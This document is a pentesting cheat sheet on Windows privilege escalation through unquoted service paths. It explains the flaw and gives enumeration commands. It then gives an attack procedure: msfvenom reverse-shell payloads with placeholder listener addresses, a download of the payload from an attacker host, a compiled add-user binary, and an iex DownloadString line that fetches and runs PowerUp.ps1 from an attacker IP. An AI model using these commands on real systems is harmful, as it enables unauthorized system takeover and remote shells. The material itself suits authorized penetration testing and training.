######################################################################
# Presentation.

#The UnquotedServicePath hijack is a Windows PrivEsc vector in which we leverage a malconfiguration Windows feature related to unquoted binpath strings. 

#The OS, in order to init a service must run the executable binary associated with it. If the binpath var, that stores the path to the service's binary, 
# oesn't have quotes the system would interpret the string as a command with arguments delimitated by spaces.

# For example: 
## VULNERABLE PATH: C:\Program Files\My Program\My Service\service.exe
## WRITEABLE PATH BY YOUR USER: C:\Program Files\My Program\
## You need to name your malicious binary as --> My.exe, place it in C:\Program Files\My Program\ and then Restart-Service because the way that Windows performs the binary search is:
## 1.- C:\Program.exe
## 2.- C:\Program Files\My.exe
## 3.- C:\Program Files\My Program\My.exe --> When Windows find My.exe in this search, it will execute our malicious binary instead of the legit one service.exe.

######################################################################
#### icacls permissions mask ####

# + Mask +++++++ Permissions +
#   F             Full access
#   M             Modify access
#   RX            Read and execute access
#   R             Read-only access
#   W             Write-only access

######################################################################

#### Enumeration ####

#List Name,State,Paths of services.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

#Displays unquoted bin paths from services.
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ 
>
>"

#Checking wether we can start/stop/restart services or not: 
Start-Service <SERVICE_NAME>
Restart-Service <SERVICE_NAME>
Stop-Service <SERVICE_NAME>

#Check permissions of icacls.
icacls "<BINPATH>" #Check permissions of icacls.

#### Leading the attack ####

#Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:
## x86 Payload:
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe

## x64 Payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe

##Or compiling adduser.c:
x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe

#Transfer file
iwr -uri http://<ATTACKER_IP>/<SERVICE>.exe -Outfile <PATHFILE>.exe 

#NOTE: as the vulnerable unquoted path checks gradually the path using the rest of ir as arguments, You should use a binary name that is part of the path you can write to. 

#PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
Invoke-AllChecks
